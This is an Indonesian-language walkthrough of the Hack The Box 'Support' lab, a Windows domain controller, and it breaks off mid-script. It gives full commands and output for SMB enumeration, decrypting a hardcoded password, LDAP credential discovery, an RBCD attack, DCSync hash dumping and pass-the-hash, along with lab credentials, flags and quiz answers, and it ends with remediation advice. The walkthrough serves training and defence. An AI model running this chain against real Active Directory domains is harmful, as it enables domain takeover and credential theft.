# HTB Support — Full Walkthrough (Windows / Active Directory)

> **Box:** Support · **OS:** Windows Server 2022 (Domain Controller) · **Difficulty:** Easy
> **Target:** `10.129.132.189` · **Domain:** `support.htb` · **Hostname:** `dc.support.htb`
>
> **Attack path:**
> SMB share `support-tools` → reverse engineering `UserInfo.exe` → dekripsi XOR → kredensial LDAP →
> enumerasi LDAP (kolom `info` membocorkan sandi `support`) → WinRM (5985) → **user.txt** →
> BloodHound: `GenericAll` atas `DC.SUPPORT.HTB` → `ms-DS-MachineAccountQuota=10` → **RBCD** →
> tiket Administrator → `ticketConverter.py` + `KRB5CCNAME` → DCSync → **root.txt**

---

## 🏁 Flags

| Flag | Path | Nilai |
|------|------|-------|
| **user.txt** | `C:\Users\support\Desktop\user.txt` | `89a381869efa1cc9ad5cc956ba3bad00` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` | `d278687f0a6b6875e385f5e73a0256dc` |

---

## 🧩 Jawaban Quiz (semua terverifikasi langsung di box)

| # | Pertanyaan | Jawaban |
|---|-----------|---------|
| 1 | Jumlah share SMB yang ditampilkan host | **6** (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `support-tools`, `SYSVOL`) |
| 2 | Kolom LDAP pengguna `support` yang berpotensi menyimpan kata sandi | **`info`** |
| 3 | Port yang memungkinkan grup *Remote Management Users* dapat shell PowerShell | **5985** (WinRM/WSMan) |
| 4 | Hak akses pengguna `support` atas objek `DC.SUPPORT.HTB` (BloodHound) | **GenericAll** |
| 5 | Atribut domain penentu jumlah akun komputer yang boleh dibuat pengguna | **`ms-DS-MachineAccountQuota`** |
| 6 | Skrip Impacket pengonversi tiket ke format *ccache* | **`ticketConverter.py`** |
| 7 | Variabel lingkungan penunjuk berkas ccache | **`KRB5CCNAME`** |

---

## 🧰 Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `nmap` | Recon port & service |
| `smbclient` / `nxc smb` | Enumerasi & unduh share SMB |
| `unzip`, `strings` | Ekstraksi & pembacaan biner `UserInfo.exe` |
| `dnSpy` / `ILSpy` / `monodis` | Decompile .NET (opsional, untuk baca logika dekripsi) |
| `python3` | Skrip dekripsi XOR |
| `ldapsearch` | Enumerasi direktori AD |
| `nxc winrm` / `evil-winrm` | Shell interaktif via WinRM |
| `bloodhound-python` | Koleksi data BloodHound |
| `impacket-addcomputer` | Buat akun komputer palsu |
| `impacket-rbcd` | Set *Resource-Based Constrained Delegation* |
| `impacket-getST` | Minta tiket (S4U2Self + S4U2Proxy) |
| `impacket-ticketConverter` | Konversi `.kirbi` ↔ `.ccache` |
| `impacket-secretsdump` | DCSync → hash Administrator |
| `impacket-wmiexec` | Eksekusi perintah sebagai Administrator |

### Setup awal (host attacker)

```bash
# Peta domain ke IP target (butuh root)
echo "10.129.132.189 support.htb dc.support.htb" | sudo tee -a /etc/hosts

# Kalau tidak punya akses root, gunakan flag -target-ip pada Impacket
# (lihat bagian Troubleshooting)
```

---

## 🔎 Step 1 — Reconnaissance

### 1.1 Nmap (port lengkap + deteksi service)

```bash
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 10.129.132.189
```

Output (ringkas):

```
PORT     STATE    SERVICE
53/tcp   open     domain
88/tcp   open     kerberos-sec
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
389/tcp  open     ldap
445/tcp  open     microsoft-ds
464/tcp  open     kpasswd5
593/tcp  open     http-rpc-epmap
636/tcp  open     ldapssl
3268/tcp open     globalcatLDAP
3269/tcp open     globalcatLDAPssl
5985/tcp open     wsman          <-- WinRM
9389/tcp open     adws
```

**Kesimpulan:** ini **Domain Controller** (`support.htb`). Port `5985` (WinRM) terbuka, dan `5986` (WinRM HTTPS) filtered.

### 1.2 Enumerasi SMB — share anonim

```bash
smbclient -L //10.129.132.189/ -N
```

Ditemukan **6 share**:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools     <-- SHARE NON-DEFAULT
SYSVOL          Disk      Logon server share
```

Verifikasi silang dengan kredensial:

```bash
nxc smb 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful' --shares
```

`support-tools` dapat diakses **anonim** (Null Auth: True) dan berisi utilitas bantuan pengguna:

```bash
smbclient //10.129.132.189/support-tools -N -c 'ls'
```

### 1.3 Unduh share

```bash
mkdir -p ~/support && cd ~/support
smbclient //10.129.132.189/support-tools -N -c 'prompt off; mget *'
unzip -o UserInfo.exe.zip
ls -la
```

---

## 🔬 Step 2 — Reverse Engineering `UserInfo.exe`

`UserInfo.exe` adalah biner **.NET** yang menyimpan kredensial LDAP secara **terenkripsi lemah (XOR)** di dalam dirinya.

### 2.1 Ekstraksi string (cepat, tanpa decompiler)

String .NET disimpan sebagai **UTF-16LE**, jadi pakai `strings -el`:

```bash
strings -el UserInfo.exe | grep -iE "ldap|pass|user|key|encrypt"
```

Hasil penting:

```
LDAP://support.htb
support\ldap
armando
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

| Item | Nilai |
|------|-------|
| LDAP server | `LDAP://support.htb` |
| LDAP user | `support\ldap` |
| Key | `armando` |
| Encrypted password (Base64) | `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E` |

### 2.2 Decompile (opsional, untuk memastikan logika)

Dengan **dnSpy** / **ILSpy**, fungsi `getPassword()` pada class `Protected`:

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E");
    byte[] key = Encoding.ASCII.GetBytes("armando");
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
    return Encoding.UTF8.GetString(array);
}
```

**Logika:** Base64-decode → XOR tiap byte dengan key `armando` (berulang) → XOR dengan `0xDF`.

### 2.3 Dekripsi

```bash
python3 - <<'EOF'
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
out = bytes(b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(data))
print("Password LDAP:", out.decode())
EOF
```

Hasil:

```
Password LDAP: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## 📂 Step 3 — Enumerasi LDAP & Temukan Kolom Sandi

### 3.1 Verifikasi kredensial + lihat objek `support`

```bash
ldapsearch -x -H ldap://10.129.132.189 \
  -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(sAMAccountName=support)"
```

Output penting:

```
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful          <-- KATA SANDI BOCOR
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
company: support
name: support
userAccountControl: 66048
sAMAccountName: support
```

### 3.2 Analisis: kenapa kolom `info`?

| Kolom | Isi | Mencurigakan? |
|-------|-----|---------------|
| `cn`, `name` | `support` | ❌ nama akun |
| `c`, `l`, `st`, `postalCode` | `US`, `Chapel Hill`, `NC`, `27514` | ❌ metadata alamat |
| `company` | `support` | ❌ metadata |
| `userAccountControl` | `66048` | ❌ nilai AD normal |
| `memberOf` | grup | ❌ keanggotaan |
| **`info`** | **`Ironside47pleasure40Watchful`** | ✅ **passphrase, tidak seharusnya di sini** |

> **Catatan:** AD **tidak** menyimpan sandi di atribut `userPassword` (hash ada di `unicodePwd`, tak terbaca via LDAP biasa). `info` adalah atribut bebas-teks (RFC 4519) yang **salah tempat** untuk kredensial — itu bendera merahnya.

**Kredensial yang didapat:** `support` : `Ironside47pleasure40Watchful`

---

## 🖥️ Step 4 — WinRM Shell → user.txt

`support` adalah anggota grup **Remote Management Users**, sehingga bisa login WinRM di **port 5985**.

### 4.1 Uji kredensial

```bash
nxc winrm 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful'
```

```
WINRM  10.129.132.189  5985  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM  10.129.132.189  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

### 4.2 Shell interaktif

```bash
evil-winrm -i 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful'
```

### 4.3 Ambil user.txt

```bash
nxc winrm 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful' \
  -x 'type C:\Users\support\Desktop\user.txt'
```

```
89a381869efa1cc9ad5cc956ba3bad00
```

> **🚩 user.txt = `89a381869efa1cc9ad5cc956ba3bad00`**

> **Catatan:** `nxc` gagal dengan shell `cmd` (`no 'Invoke' rights`) tapi berhasil dengan shell **PowerShell** — konsisten dengan hak WinRM grup Remote Management Users.

---

## 🩸 Step 5 — BloodHound: Temukan Jalur ke Domain Admin

### 5.1 Koleksi data

Gunakan kredensial LDAP (akses baca direktori lebih luas):

```bash
mkdir -p /tmp/bh && cd /tmp/bh
bloodhound-python -d support.htb \
  -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -ns 10.129.132.189 -dc support.htb -c ALL --zip
```

### 5.2 Analisis ACE pada objek `DC.SUPPORT.HTB`

```bash
unzip -o *.zip >/dev/null
python3 - <<'EOF'
import json, glob
def load(p):
    f = glob.glob(p)[0]
    d = json.load(open(f))
    return d['data'] if isinstance(d, dict) and 'data' in d else d

users, groups = load('/tmp/bh/*users.json'), load('/tmp/bh/*groups.json')
byid = {x['ObjectIdentifier']: x for x in users + groups}

for c in load('/tmp/bh/*computers.json'):
    print("COMPUTER:", c['Properties']['name'])
    for ace in c.get('Aces', []):
        sid = ace.get('PrincipalSID')
        who = byid.get(sid, {}).get('Properties', {}).get('name', sid)
        print(f"   {ace.get('RightName'):22} <- {who}")
EOF
```

Output:

```
COMPUTER: DC.SUPPORT.HTB
   Owns                   <- DOMAIN ADMINS@SUPPORT.HTB
   GenericAll             <- DOMAIN ADMINS@SUPPORT.HTB
   GenericAll             <- SHARED SUPPORT ACCOUNTS@SUPPORT.HTB     <-- JALUR KITA
   AddKeyCredentialLink   <- KEY ADMINS@SUPPORT.HTB
   AddKeyCredentialLink   <- ENTERPRISE KEY ADMINS@SUPPORT.HTB
   GenericAll             <- ENTERPRISE ADMINS@SUPPORT.HTB
   GenericWrite           <- ADMINISTRATORS@SUPPORT.HTB
   WriteOwner             <- ADMINISTRATORS@SUPPORT.HTB
   WriteDacl              <- ADMINISTRATORS@SUPPORT.HTB
```

### 5.3 Rantai serangan

```
support ──MemberOf──▶ Shared Support Accounts ──GenericAll──▶ DC.SUPPORT.HTB
```

> **Jawaban quiz:** hak `support` atas `DC.SUPPORT.HTB` = **`GenericAll`** (diwarisi via grup *Shared Support Accounts*).

**Arti GenericAll pada objek komputer:** kendali penuh → bisa `WriteDacl`/`WriteOwner`, menulis `msDS-AllowedToActOnBehalfOfOtherIdentity` (**RBCD**), atau *Shadow Credentials*.

---

## 🔢 Step 6 — `ms-DS-MachineAccountQuota`

Atribut pada **domain NC head** yang menentukan berapa akun komputer boleh dibuat pengguna biasa.

> ⚠️ Ini **operational attribute** — hanya terbaca jika query menyertakan `*` atau `+`.

```bash
ldapsearch -x -H ldap://10.129.132.189 \
  -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" -s base "*" "+" | grep -i machineaccountquota
```

Atau lebih ringkas dengan `nxc`:

```bash
nxc ldap 10.129.132.189 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  --query "(objectClass=domain)" "ms-DS-MachineAccountQuota"
```

```
LDAP  10.129.132.189  389  DC  [+] Response for object: DC=support,DC=htb
LDAP  10.129.132.189  389  DC  ms-DS-MachineAccountQuota 10
```

> **Jawaban quiz:** **`ms-DS-MachineAccountQuota`** = `10` (default AD) → pengguna biasa boleh menambah hingga 10 komputer.

---

## ⚔️ Step 7 — Serangan RBCD (Resource-Based Constrained Delegation)

### 7.1 Buat komputer palsu

```bash
cd /tmp/bh
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'FakeP@ssw0rd123!' \
  -dc-ip 10.129.132.189 'support.htb/support:Ironside47pleasure40Watchful'
```

```
[*] Successfully added machine account FAKE$ with password FakeP@ssw0rd123!.
```

### 7.2 Set RBCD pada objek `DC$` (pakai hak GenericAll)

```bash
impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE$' -action write \
  -dc-ip 10.129.132.189 'support.htb/support:Ironside47pleasure40Watchful'
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```

### 7.3 Minta tiket Administrator (S4U2Self + S4U2Proxy)

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip 10.129.132.189 'support.htb/FAKE$:FakeP@ssw0rd123!'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Tiket tersimpan: **`Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`**

---

## 🎫 Step 8 — Konversi Tiket & `KRB5CCNAME`

### 8.1 `ticketConverter.py`

Impacket mengonversi tiket antara format `.kirbi` (Windows/Rubeus) dan `.ccache` (Linux/MIT):

```bash
# Rubeus menghasilkan .kirbi -> konversi ke .ccache
impacket-ticketConverter administrator.kirbi administrator.ccache
```

> **Jawaban quiz:** skrip Impacket-nya = **`ticketConverter.py`** (di Kali: `impacket-ticketConverter`).

### 8.2 `KRB5CCNAME`

Variabel lingkungan yang menunjuk ke berkas ccache, agar tool seperti `psexec.py` bisa dipakai dengan `-k -no-pass`:

```bash
export KRB5CCNAME=/tmp/bh/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

> **Jawaban quiz:** variabel lingkungan = **`KRB5CCNAME`**.

**Syarat `-k` bekerja:**

1. Pakai **FQDN**, bukan IP (`dc.support.htb`) — Kerberos terikat pada nama SPN.
2. `/etc/hosts` sudah memetakan `dc.support.htb → 10.129.132.189` (atau pakai `-target-ip`).
3. Principal di ccache cocok (`administrator@SUPPORT.HTB`).
4. `export` hanya berlaku per-shell.

---

## 💀 Step 9 — DCSync → root.txt

### 9.1 DCSync hash Administrator

```bash
cd /tmp/bh
export KRB5CCNAME=/tmp/bh/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

impacket-secretsdump -k -no-pass -target-ip 10.129.132.189 \
  -just-dc-user Administrator support.htb/Administrator@dc.support.htb
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
[*] Cleaning up...
```

**Hash NTLM Administrator:** `bb06cbc02b39abeddd1335bc30b19e26`

### 9.2 Ambil root.txt

```bash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 \
  support.htb/Administrator@10.129.132.189 \
  'type C:\Users\Administrator\Desktop\root.txt'
```

```
d278687f0a6b6875e385f5e73a0256dc
```

> **🚩 root.txt = `d278687f0a6b6875e385f5e73a0256dc`**

### 9.3 Alternatif: shell admin penuh

```bash
export KRB5CCNAME=/tmp/bh/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass -target-ip 10.129.132.189 support.htb/Administrator@dc.support.htb
```

---

## 🧹 Step 10 — Cleanup (higiene)

```bash
# Hapus delegasi RBCD
impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE$' -action remove \
  -dc-ip 10.129.132.189 'support.htb/support:Ironside47pleasure40Watchful'

# Hapus akun komputer palsu (perlu hak admin -> pakai hash Administrator)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 \
  support.htb/Administrator@10.129.132.189 \
  'powershell -c "Remove-ADComputer -Identity FAKE -Confirm:$false"'
```

Verifikasi (harus hanya tersisa `DC`):

```bash
nxc ldap 10.129.132.189 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  --query "(objectClass=computer)" "name"
```

---

## 🧭 Cheat Sheet — Semua Perintah Berurutan

```bash
# ---------- 0. Setup ----------
echo "10.129.132.189 support.htb dc.support.htb" | sudo tee -a /etc/hosts

# ---------- 1. Recon ----------
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 10.129.132.189
smbclient -L //10.129.132.189/ -N

# ---------- 2. Ambil & bedah UserInfo.exe ----------
mkdir -p ~/support && cd ~/support
smbclient //10.129.132.189/support-tools -N -c 'prompt off; mget *'
unzip -o UserInfo.exe.zip
strings -el UserInfo.exe | grep -iE "ldap|pass|user|key"

# ---------- 3. Dekripsi XOR ----------
python3 - <<'EOF'
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
print(bytes(b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(data)).decode())
EOF
# -> nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

# ---------- 4. Enumerasi LDAP ----------
ldapsearch -x -H ldap://10.129.132.189 -D "ldap@support.htb" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(sAMAccountName=support)"
# -> info: Ironside47pleasure40Watchful

# ---------- 5. WinRM -> user.txt ----------
nxc winrm 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful'
nxc winrm 10.129.132.189 -u support -p 'Ironside47pleasure40Watchful' \
  -x 'type C:\Users\support\Desktop\user.txt'

# ---------- 6. BloodHound ----------
mkdir -p /tmp/bh && cd /tmp/bh
bloodhound-python -d support.htb -u ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.132.189 -dc support.htb -c ALL --zip
unzip -o *.zip >/dev/null

# ---------- 7. MachineAccountQuota ----------
nxc ldap 10.129.132.189 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  --query "(objectClass=domain)" "ms-DS-MachineAccountQuota"

# ---------- 8. RBCD ----------
cd /tmp/bh
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'FakeP@ssw0rd123!' \
  -dc-ip 10.129.132.189 'support.htb/support:Ironside47pleasure40Watchful'
impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE$' -action write \
  -dc-ip 10.129.132.189 'support.htb/support:Ironside47pleasure40Watchful'
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip 10.129.132.189 'support.htb/FAKE$:FakeP@ssw0rd123!'

# ---------- 9. Tiket -> ccache -> DCSync -> root.txt ----------
export KRB5CCNAME=/tmp/bh/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-secretsdump -k -no-pass -target-ip 10.129.132.189 \
  -just-dc-user Administrator support.htb/Administrator@dc.support.htb
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 \
  support.htb/Administrator@10.129.132.189 \
  'type C:\Users\Administrator\Desktop\root.txt'
```

---

## 🧠 Troubleshooting & Pelajaran

| Masalah | Penyebab | Solusi |
|---------|----------|--------|
| `Temporary failure in name resolution` | `/etc/hosts` belum diisi & tidak bisa ditulis (sudo minta sandi) | Pakai **`-target-ip <IP>`** pada Impacket, atau monkeypatch `socket.getaddrinfo` |
| `CCache file is not found. Skipping...` | `KRB5CCNAME` ter-*export* dari sesi sebelumnya menunjuk berkas yang belum ada | **`unset KRB5CCNAME`** sebelum `getST`, lalu set ulang setelah ccache dibuat |
| `no 'Invoke' rights ... (shell type: cmd)` | `nxc` default memakai shell cmd; grup Remote Management Users hanya dapat PowerShell | Tambahkan **`-x`** (otomatis PowerShell) atau pakai `evil-winrm` |
| `STATUS_PIPE_BROKEN` saat `psexec -k` | Shell interaktif psexec tidak stabil dengan tiket Kerberos | Pakai **`wmiexec -hashes`** untuk baca file, atau `secretsdump` untuk DCSync |
| `ldapsearch` kosong untuk `msDS-MachineAccountQuota` | Atribut **operational** tidak dikembalikan secara default | Tambahkan **`*`** dan/atau **`+`** pada daftar atribut |
| `User support doesn't have right to delete FAKE$` | Pembuat akun tidak otomatis dapat hak *delete* di container `CN=Computers` | Hapus pakai hak **Administrator** (`Remove-ADComputer` via `wmiexec`) |
| `&` ditolak di PowerShell | `&` adalah operator reserved | Jalankan perintah satu per satu, atau bungkus dalam tanda kutip |

### Poin penting

- **LDAP ≠ penyimpan sandi.** `userPassword` hampir selalu kosong di AD (hash ada di `unicodePwd`). Kalau sandi muncul, biasanya di atribut "salah tempat" seperti **`info`**, `description`, `comment`, atau `userParameters`.
- **`GenericAll` pada objek komputer = jalur tercepat ke Domain Admin** (RBCD, Shadow Credentials, atau WriteDacl).
- **`ms-DS-MachineAccountQuota` > 0** membuat RBCD bisa dimulai tanpa hak apa pun — cek selalu.
- **Rubeus vs ccache:** Rubeus menyuntik tiket ke sesi logon **saat itu**; kalau sesi dibuat sebelum injeksi, token tidak di-refresh → akses admin tidak aktif. Solusinya: ekspor tiket → `ticketConverter.py` → pakai dari sesi baru via `KRB5CCNAME`.
- **Kerberos butuh nama, bukan IP.** Selalu pakai FQDN untuk SPN.

---

## 🛡️ Remediation (Perbaikan)

| # | Kerentanan | Perbaikan |
|---|-----------|-----------|
| 1 | **Kredensial LDAP hardcoded** di `UserInfo.exe` (XOR reversibel) | Jangan pernah *hardcode* kredensial di aplikasi. Gunakan **gMSA / Managed Identity / secret manager** (Key Vault, Vault). Rotasi sandi berkala. Ingat: **obfuscation ≠ keamanan** — XOR/Base64 bisa dibalik dalam hitungan detik |
| 2 | **Share SMB anonim** `support-tools` | Matikan **null/anonymous session** (`RestrictNullSessAccess=1`, GPO *Network access: Restrict anonymous access to Named Pipes and Shares*). Batasi share ke grup tertentu. **Jangan simpan tool berkredensial di share**, apalagi yang bisa diakses anonim |
| 3 | **Kata sandi di atribut LDAP `info`** | Jangan simpan rahasia di atribut bebas-teks (`info`, `description`, `comment`, `userParameters`). Audit & bersihkan atribut tersebut secara berkala. Kelola sandi akun dengan **gMSA** atau **Windows LAPS** |
| 4 | **Sandi lemah & berpotensi *reuse*** | Terapkan kebijakan sandi kuat + rotasi, larang pemakaian ulang lintas akun layanan, pakai password manager, aktifkan **Azure AD Password Protection** (daftar hitam sandi umum) |
| 5 | **WinRM (5985) terbuka** untuk grup *Remote Management Users* | Batasi akses ke admin saja; hapus anggota yang tidak perlu dari grup. Aktifkan **JEA (Just Enough Administration)**, gunakan **WinRM over HTTPS (5986)** + sertifikat, dan segmentasi lewat firewall |
| 6 | **`GenericAll` pada objek DC** yang dipegang grup non-Tier-0 | Audit ACL objek **Tier-0** secara berkala (BloodHound / PingCastle / `Get-DomainObjectAcl`). Terapkan **least privilege** + **Tier model**. Hapus ACE berlebih dan monitor setiap perubahannya |
| 7 | **`ms-DS-MachineAccountQuota = 10`** | Set ke **`0`** — ini memutus RBCD di sumbernya:<br>`Set-ADDomain -Identity support.htb -Replace @{'ms-DS-MachineAccountQuota'='0'}`<br>Bila pembuatan komputer memang dibutuhkan, delegasikan ke **OU khusus** dengan hak terbatas |
| 8 | **Perubahan RBCD tidak dimonitor** | Audit perubahan atribut `msDS-AllowedToActOnBehalfOfOtherIdentity`. Pantau **Event ID 4741/4742** (pembuatan/perubahan akun komputer) dan **5136** (perubahan atribut direktori). Beri alert untuk delegasi baru |
| 9 | **LDAP tanpa signing & channel binding** (`signing:None`) | Aktifkan **LDAP signing** dan **LDAP channel binding** (wajib). Aktifkan **SMB signing**. Tolak bind NTLM dari host yang tidak dipercaya |
| 10 | **Akun `support` & `ldap` dengan hak berlebih** | Pisahkan akun pembaca direktori (read-only) dari akun operasional. Akun `support` tidak seharusnya berada di grup yang menyentuh Tier-0. Gunakan **gMSA** dengan hak minimal |

**Pelajaran kunci:**

- **Satu miskonfigurasi kecil berantai jadi domain takeover.** Tidak ada CVE di box ini — murni *bad practice* yang saling menumpuk.
- **`GenericAll` pada objek DC = game over.** Perlakukan DC sebagai aset **Tier-0**; ACL-nya harus diaudit seperti kode.
- **`MachineAccountQuota = 0`** adalah mitigasi termurah dan paling efektif terhadap RBCD.
- **`info`/`description` bukan tempat menyimpan rahasia.** AD tidak pernah mengekspos `userPassword`, jadi kalau sandi bocor lewat LDAP, hampir pasti dari atribut "salah tempat".
- **Obfuscation bukan enkripsi.** XOR + Base64 dengan key yang ikut tertanam di biner yang sama = sandi plaintext.

---

## 📜 Script yang Dipakai

Semua script tersimpan di **`/home/boy/support-scripts/`** dan sudah diuji (syntax check + eksekusi nyata).

| File | Fungsi |
|------|--------|
| `decrypt_ldap_pass.py` | Dekripsi sandi LDAP dari `UserInfo.exe` (Base64 → XOR → `0xDF`) |
| `bh_parse_aces.py` | Parse output BloodHound: tampilkan ACE objek komputer + resolusi SID → nama |
| `recon_support.sh` | Otomasi fase recon → initial access → `user.txt` |
| `bloodhound_collect.sh` | Koleksi BloodHound + parse ACE + baca `MachineAccountQuota` |
| `rbcd_chain.sh` | Otomasi penuh RBCD → getST → DCSync → `root.txt` |
| `cleanup_support.sh` | Bersihkan artefak (hapus RBCD + akun komputer palsu) |

### 1. `decrypt_ldap_pass.py`

```python
#!/usr/bin/env python3
"""
decrypt_ldap_pass.py — HTB Support
Mendekripsi kata sandi LDAP yang di-hardcode di dalam UserInfo.exe.

Skema: Base64-decode -> XOR dengan key berulang -> XOR 0xDF.
Pemakaian:
    python3 decrypt_ldap_pass.py
    python3 decrypt_ldap_pass.py "<base64>" "<key>"
"""
import base64
import sys

ENC_DEFAULT = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
KEY_DEFAULT = "armando"


def decrypt(enc_b64: str, key: str) -> str:
    """Base64 -> XOR(key berulang) -> XOR 0xDF -> UTF-8."""
    data = base64.b64decode(enc_b64)
    kb = key.encode("ascii")
    out = bytes(b ^ kb[i % len(kb)] ^ 0xDF for i, b in enumerate(data))
    return out.decode("utf-8")


def main() -> None:
    enc = sys.argv[1] if len(sys.argv) > 1 else ENC_DEFAULT
    key = sys.argv[2] if len(sys.argv) > 2 else KEY_DEFAULT
    print(f"[*] Encrypted (Base64) : {enc}")
    print(f"[*] Key                : {key}")
    print(f"[+] Password LDAP      : {decrypt(enc, key)}")


if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 decrypt_ldap_pass.py
# [+] Password LDAP      : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 2. `bh_parse_aces.py`

```python
#!/usr/bin/env python3
"""
bh_parse_aces.py — HTB Support
Mem-parsing output bloodhound-python dan menampilkan semua ACE pada setiap objek
KOMPUTER, dengan SID diresolusi menjadi nama principal.

Pemakaian:
    unzip -o *.zip -d bh_data
    python3 bh_parse_aces.py bh_data
"""
import glob
import json
import os
import sys


def load(path: str):
    """Buka JSON BloodHound; tangani dua bentuk ({"data": [...]} atau [...])."""
    with open(path, encoding="utf-8") as fh:
        d = json.load(fh)
    return d["data"] if isinstance(d, dict) and "data" in d else d


def load_first(directory: str, pattern: str):
    hits = glob.glob(os.path.join(directory, pattern))
    return load(hits[0]) if hits else []


def build_sid_map(directory: str) -> dict:
    users = load_first(directory, "*_users.json")
    groups = load_first(directory, "*_groups.json")
    return {
        obj["ObjectIdentifier"]: obj["Properties"].get("name")
        for obj in users + groups
    }


def main(directory: str = ".") -> None:
    sid2name = build_sid_map(directory)
    for path in glob.glob(os.path.join(directory, "*_computers.json")):
        for comp in load(path):
            print(f"\nCOMPUTER: {comp['Properties']['name']}")
            for ace in comp.get("Aces", []):
                sid = ace.get("PrincipalSID")
                who = sid2name.get(sid, sid)
                print(f"   {ace.get('RightName', '?'):22} <- {who}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else ".")
```

Jalankan:

```bash
python3 bh_parse_aces.py /tmp/bh/bh_data
# COMPUTER: DC.SUPPORT.HTB
#    GenericAll             <- SHARED SUPPORT ACCOUNTS@SUPPORT.HTB
```

### 3. `recon_support.sh`

```bash
#!/usr/bin/env bash
# recon_support.sh — HTB Support : Fase Recon & Initial Access
set -uo pipefail

DC_IP="${DC_IP:-10.129.132.189}"
DOMAIN="${DOMAIN:-support.htb}"
DC_HOST="${DC_HOST:-dc.support.htb}"
WORKDIR="${WORKDIR:-$HOME/support}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

LDAP_USER="ldap@${DOMAIN}"
LDAP_PASS='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SUP_USER='support'
SUP_PASS='Ironside47pleasure40Watchful'

mkdir -p "$WORKDIR"

